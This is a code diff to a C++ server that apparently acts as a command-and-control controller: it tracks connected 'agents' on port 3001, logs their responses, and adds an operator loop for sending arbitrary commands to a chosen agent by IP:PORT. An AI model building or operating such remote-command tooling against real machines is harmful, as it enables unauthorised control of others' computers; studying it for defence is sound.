@@ -1,5 +1,12 @@
 #include "Server.hpp"
 
+
+std::string GetSocketStr(SocketClientInfo& socketClientInfo) {
+    std::ostringstream oss;
+    oss << socketClientInfo.szIp << ":" << socketClientInfo.nPort;
+    return oss.str();
+}
+
 VOID PrintActiveSockets(std::vector<AgentConnection*>& arrAgentConnections) {
     SocketClientInfo socketClientInfo;
 
@@ -11,7 +18,7 @@ VOID PrintActiveSockets(std::vector<AgentConnection*>& arrAgentConnections) {
 
         for (AgentConnection* conn : arrAgentConnections) {
             conn->GetSocketClientInfo(socketClientInfo);
-            std::cout << "[+] Connected to " << socketClientInfo.szIp << ":" << socketClientInfo.nPort << "\n";
+            std::cout << "[+] Connected to " << GetSocketStr(socketClientInfo) << "\n";
         }
     }
 }
@@ -49,7 +56,7 @@ BOOL ListenForTcpPort(INT nPort, SOCKET listeningSocket, std::vector<AgentConnec
                 AgentConnection* agentCon = new AgentConnection(clientSocket);
                 arrAgentConnections.push_back(agentCon);
                 agentCon->GetSocketClientInfo(socketClientInfo);
-                std::cout << "[+] Connected to " << socketClientInfo.szIp << ":" << socketClientInfo.nPort << "\n";
+                std::cout << "[+] Connected to " << GetSocketStr(socketClientInfo) << "\n";
                 PrintActiveSockets(arrAgentConnections);
              
             }
@@ -67,7 +74,7 @@ BOOL ListenForTcpPort(INT nPort, SOCKET listeningSocket, std::vector<AgentConnec
                 conn->GetSocketClientInfo(socketClientInfo);
 
                 if (nBytesReceived <= 0) {
-                    std::cout << "[+] Disonnected from " << socketClientInfo.szIp << ":" << socketClientInfo.nPort << "\n";
+                    std::cout << "[-] Disonnected from " << GetSocketStr(socketClientInfo) << "\n";
                     FD_CLR(conn->GetSocket(), &master_set);
 
                     delete conn;
@@ -78,13 +85,12 @@ BOOL ListenForTcpPort(INT nPort, SOCKET listeningSocket, std::vector<AgentConnec
                 }
                 else {
                     buffer[nBytesReceived] = '\0';
-                    std::cout << "[Agent " << socketClientInfo.szIp << ":" << socketClientInfo.nPort << "] " << buffer << std::endl;
+                    std::cout << "[Agent " << GetSocketStr(socketClientInfo) << "] response: " << buffer << std::endl;
                 }
             }
 
             ++connectionsIterator;
         }
-
     }
 
 
@@ -157,7 +163,36 @@ int main() {
 
     std::cout << "[+] Listening for clients on port 3000\n";
     std::cout << "[+] Listening for agents on port 3001\n";
+    std::cout << "[*] Press any key to send commands\n";
+    while (TRUE) {
+        if (_kbhit()) {
+            std::string szIpPortToCommand;
+            std::string szCommand;
 
+            std::cout << "Enter IP:PORT to command: ";
+            std::getline(std::cin, szIpPortToCommand);
+            SocketClientInfo socketClientInfo;
+            for (AgentConnection* conn : arrAgentConnections) {
+                conn->GetSocketClientInfo(socketClientInfo);
+                if (GetSocketStr(socketClientInfo) == szIpPortToCommand) {
+                    std::cout << "[*] Socket exists!\n";
+                    std::cout << "[*] Enter command to run on "<< szIpPortToCommand << "\n";                                    
+                    std::getline(std::cin, szCommand);
+                    
+                    if (!szCommand.empty()) {
+                        conn->SendCommand(szCommand);
+                    }
+                    else {
+                        std::cout << "[!] Command cannot be empty.\n";
+                    }
+                }
+                else {
+                    std::cout << "[!] Socket does not exist!\n";
+                }
+            }
+        }
+
+    }
     /*AgentConnection* a = new AgentConnection(arrListeningSockets[1]);
     SocketClientInfo info;
     a->GetSocketClientInfo(info);
